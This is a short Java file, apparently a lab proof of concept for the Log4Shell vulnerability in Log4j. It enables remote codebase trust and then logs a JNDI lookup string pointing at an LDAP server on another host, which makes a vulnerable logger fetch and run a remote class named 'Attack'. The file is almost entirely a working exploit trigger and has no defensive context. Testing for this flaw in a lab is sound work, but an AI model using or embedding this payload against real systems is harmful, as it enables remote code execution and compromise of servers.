package com;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author fuping
 */
public class Log4jTest {

    private static final Logger LOGGER = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        LOGGER.info("{}", "${jndi:ldap://172.16.102.19:9991/Attack}");
    }
}
